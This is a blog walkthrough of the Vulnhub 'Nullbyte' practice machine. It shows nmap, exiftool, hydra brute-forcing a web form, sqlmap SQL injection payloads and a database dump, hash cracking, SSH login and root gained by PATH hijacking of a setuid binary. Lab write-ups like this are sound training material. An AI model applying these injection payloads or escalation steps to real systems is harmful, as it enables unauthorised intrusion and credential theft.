---
published: true
---
First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be the way to go. Something about [Vulnhub](https://www.vulnhub.com/) attracting my attention after examining the lot. I believe this is a great way to practice on skills I use everyday on engagements, but also to rehash some techniques rarely used. Personally, I don't find myself reverse engineering an executable on every gig :) Anyway, I figured I would take a swing at [Nullbyte](https://www.vulnhub.com/entry/nullbyte-1,126/) written by [lyon](https://twitter.com/@ly0nx).  Let's get started.

After loading the image, first batter up...nmap. 

```bash
# Nmap 6.49BETA5 scan initiated Wed Dec  9 17:01:29 2015 as: nmap -T4 -A -v -oA nullbyte 192.168.61.147
Nmap scan report for 192.168.61.147
Host is up (0.00073s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          43382/tcp  status
|_  100024  1          49406/udp  status
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
MAC Address: 00:0C:29:95:8C:1C (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.19
Uptime guess: 0.048 days (since Wed Dec  9 15:52:33 2015)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.61.147

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  9 17:01:38 2015 -- 1 IP address (1 host up) scanned in 9.09 seconds
```
We are working ssh on port 777, apache, and rpcbind. Apache first. I curl the website for the initial response. Not really necessary, more habitual. 

```bash
curl http://192.168.61.147/

<html>
<head><title>Null Byte 00 - level 1</title></head>
<body>
<center>
<img src="main.gif">
<p> If you search for the laws of harmony, you will find knowledge. </p>
</center>	

</body>
</html>

```

Basically just an image, lets see what we have. 

![Just an image?](/images/website.png)

Okay it's really just an image, nothing else it seems. Maybe theres something in the image. My first thought it either metadata or stegonagraphy. Metadata first. After searching the net I come across a tool called [exiftool](http://www.sno.phy.queensu.ca/~phil/exiftool/), which is a pretty neat as it extracts the meta information about an image. I'm sure it does alot more, but for the purposes of this test I just need to read the data.

```bash
./exiftool main.gif

ExifTool Version Number         : 10.05
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:12:09 17:08:46-06:00
File Access Date/Time           : 2015:12:09 17:09:09-06:00
File Inode Change Date/Time     : 2015:12:09 17:08:46-06:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071

```
Immediately the comment field jumps out, perhaps it's the "P-):"...winky face perhaps? Anyway, obviously we have a key to use. Given the webpage doesn't have any input fields, I figure why not try it as a directory. To my luck...success.

![use key as file path](/images/key.png)

Okay now we are working with something. Examining the source code of this site gives me the following hint. 

```
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>html

```

HTTP Post request, with a password that "ain't" that complex...so it's an easy password...brute force? I break out hydra. I'm not to familiar with hydra (I don't do much password cracking) so it took awhile to get the switches to work correctly.

```bash
hydra 192.168.61.147 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /usr/share/wordlists/rockyou.txt -la | tee nullbyte.hydra

Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-09 17:16:53
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: 192.168.61.147   login: a   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-09 17:17:16
```

This took about 30 seconds surprisingly, password is "elite". Which brings me deeper into the site. 

![Elite worked](/images/elite_success.png)

Entering anything into the parameter gives you the a successful data fetch of what I assume are usernames. Playing around with the input your provide will sometimes give you one or two usernames. This definitely smells like sql injection. Given this is a practice image, I'm was sure sqli would come into play at some point.

```bash
sqlmap -u "http://192.168.61.147/kzMb5nVYJw/420search.php?usrtosearch=x" | tee nullbyte.sql

         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151017}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:23:07

[17:23:07] [INFO] testing connection to the target URL
[17:23:07] [INFO] testing if the target URL is stable
[17:23:08] [INFO] target URL is stable
[17:23:08] [INFO] testing if GET parameter 'usrtosearch' is dynamic
[17:23:08] [WARNING] GET parameter 'usrtosearch' does not appear dynamic
[17:23:08] [INFO] heuristic (basic) test shows that GET parameter 'usrtosearch' might be injectable (possible DBMS: 'MySQL')
[17:23:08] [INFO] testing for SQL injection on GET parameter 'usrtosearch'

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [17:23:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:23:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:23:21] [WARNING] reflective value(s) found and filtering out
[17:23:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:23:21] [INFO] GET parameter 'usrtosearch' seems to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
[17:23:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:23:21] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:23:21] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:23:21] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:23:21] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:23:21] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:23:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:23:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'
[17:23:21] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:23:21] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'
[17:23:21] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
[17:23:21] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:23:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[17:23:21] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:23:21] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:23:21] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:23:21] [INFO] testing 'MySQL inline queries'
[17:23:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[17:23:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'
[17:23:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[17:23:21] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[17:23:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[17:23:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[17:23:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[17:23:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT)'
[17:23:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)'
[17:23:32] [INFO] GET parameter 'usrtosearch' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)' injectable 
[17:23:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:23:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:23:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:23:32] [INFO] target URL appears to be UNION injectable with 3 columns
[17:23:32] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[17:23:32] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[17:23:32] [WARNING] automatically patching output having last char trimmed

GET parameter 'usrtosearch' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 152 HTTP(s) requests:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: usrtosearch=-4968" OR 5589=5589#

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
    Payload: usrtosearch=x" AND (SELECT * FROM (SELECT(SLEEP(5)))UcAb)#

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=x" UNION ALL SELECT CONCAT(0x716a6a6a71,0x5145485546617555536c,0x7171716b71),NULL,NULL#
---
[17:23:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0.12
[17:23:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.61.147'

[*] shutting down at 17:23:42
```

Success! We could start enumerating the available databases, tables, etc. However, why not just dump everything? I append the "--dump-all" switch and [tee](http://linux.101hacks.com/unix/tee-command-examples/) the output. After the dump I do a search for ramses, and come across this. 

```bash
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

[17:24:09] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.61.147/dump/seth/users.csv'
```

There's a hash of some sort for ramses, but not for isis. It doesn't quite look like md5, sha256 perhaps? I don't know. For starters, I pipe it into Burp Suite Decoder and try out the options. After using the Base64 option I get a hash that looks more like a md5. Given it's most likely to be a password of some sort, on an Debian box, most likey md5. Hopefully it is. 

![Burp Decoder](/images/base64.png)

Okay great, now to crack it. We could use [john](http://www.openwall.com/john/), but [CrackStation](https://crackstation.net/) is much faster :) This gives us the password of 'omega'. I'm hoping that this will be the credentials for the SSH loggin. Let's give it a shot. 

```bash
ssh -l ramses -p 777 192.168.61.147
ramses@192.168.61.147's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 26 02:28:07 2015 from 192.168.61.146

ramses@NullByte:~$ ls
recent_history
ramses@NullByte:~$ cat recent_history
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
ramses@NullByte:~$ sh
$ exit
ramses@NullByte:~$ which sh
/bin/sh
ramses@NullByte:~$ sudo sh
[sudo] password for ramses: 
ramses is not in the sudoers file.  This incident will be reported.
ramses@NullByte:~$ 

```
Next clue, a program called procwatch in /var/www/backup. 

```bash
ramses@NullByte:~$ cd /var/www/backup
ramses@NullByte:/var/www/backup$ ls
procwatch  readme.txt
rramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 2208 pts/0    00:00:00 procwatch
 2209 pts/0    00:00:00 sh
 2210 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$
```

Alright so procwatch seems to just be listing the processes. There has to be something more to this. After trying a number of useless attempts, I decide to take a slightly deeper look into this file. 

```bash
ramses@NullByte:/var/www/backup$ ls -l procwatch 
-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
ramses@NullByte:/var/www/backup$ file procwatch 
procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped
ramses@NullByte:/var/www/backup$ 
```
Okay so we have an executable, that's running ps as root. Hmm. Okay since ps is really just a file in /bin, and $PATH sets the directories where executables can be found, I'm going to have to manipulate this environment variable. If I can get procwatch to run sh instead of ps, it should give me root shell :) I decide to copy the current shell executable (/bin/sh) into /tmp. I initially wanted to do ```cp /bin/sh /usr/local/bin/ps```  given /usr/local/bin was first on the list. Permission denied. Stupid decision I know. So end up prepending /tmp to $PATH, then running procwatch again. 

```bash
ramses@NullByte:~$ cp /bin/sh /tmp/ps
ramses@NullByte:~$ export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ cd /var/www/backup
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```
Yes! Officially root. Now just grab the key and we are out of here!

```bash
# cd /root  		
# ls
proof.txt
# cat proof.txt	
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```
That my friends is how it's done. For my first time, this was a excellent (although stressful) challenge. If you've stuck with me this far, thanks for hanging in there. I'll try to make future writeups more concise. Thanks to VulnHub for supplying and lyon for creating!
